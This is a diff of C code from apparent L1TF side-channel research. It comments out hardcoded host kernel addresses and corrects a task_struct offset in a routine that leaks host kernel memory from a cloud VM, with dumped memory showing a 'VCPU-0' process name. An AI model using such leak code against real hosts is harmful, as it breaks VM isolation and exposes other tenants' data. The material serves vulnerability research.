@@ -109,11 +109,11 @@ void reverse_host_kernel_data_structures(void)
 {
         // Results below were gathered on rain-vm-gce.
 
-	uintptr_t base = 0x88d43f218;
+	// uintptr_t base = 0x88d43f218;
 	
-	uintptr_t direct_map = 0xffff934040000000;
+	// uintptr_t direct_map = 0xffff934040000000;
 
-	uintptr_t kvm_lapic = 0xffff9348e6de5e00;
+	// uintptr_t kvm_lapic = 0xffff9348e6de5e00;
 
 
 	// printf("kvm_lapic:\n");
@@ -206,44 +206,16 @@ void reverse_host_kernel_data_structures(void)
 	//                0                0
 	// ffff93d4de463828                0
 
-
-	// uintptr_t task_struct = *(uintptr_t *)&data[0x10] - 0xa40; // *(pid+0x10)
-	// uintptr_t task_struct = 0xffff936a91dbaa78 - 0xa40; // *(pid+0x10)
-	// printf("task_struct+0xbf0-0x80:\n");
-	// for (int off = 0xbf0-0x80; off <= 0xbf0+0x80; off += 0x40) {
-	// 	char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
-	// 	display_data(data);
-	// }
-	// task_struct:                                                                                                                                                                                                  
-	// ffffffffffffffff                0
-	//                0     b867ebe6d789
-	// ffff93427672ac78 ffff93427672ac78
-	//                0                0
-	// ffffffff83535a5f      f0000000000
-	//      f0000000f00 ffff936a91dbac00
-	// ffff936a91dbac00  f00000000000000
-	//  f000000000f0000 ffff934150af7000
-	// ffff934150af7000                0
-	// 6f00302d55504356                f  <--- comm "VCPU-0" is at +0xc80!
-	//                0                0
-	//                0                0
-	// ffff9341571b7940 ffff934154313600
-	// ffff93414def56c0 ffff93417311bb40
-	// ffff93414d72b3c0                0
-	//                0                0
-
-
-
 	// struct task_struct {
 	// 	+ 64	static_prio
 	// 	+ 68	normal_prio
 	// 	+ 6c	rt_priority
 	// 	+900	tasks
 	// 	+a78	pid_links
-	// 	+cb8	comm
+	// 	+c38	comm
 	// }
 	// uintptr_t task_struct = *(uintptr_t *)&data[0x10] - 0xa78; // *(pid+0x10)
-	uintptr_t task_struct = 0xffff936a91dbaa78 - 0xa78; // *(pid+0x10)
+	// uintptr_t task_struct = 0xffff936a91dbaa78 - 0xa78; // *(pid+0x10)
 	// printf("task_struct:\n");
 	// for (int off = 0; off < 0x100; off += 0x40) {
 	// 	char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
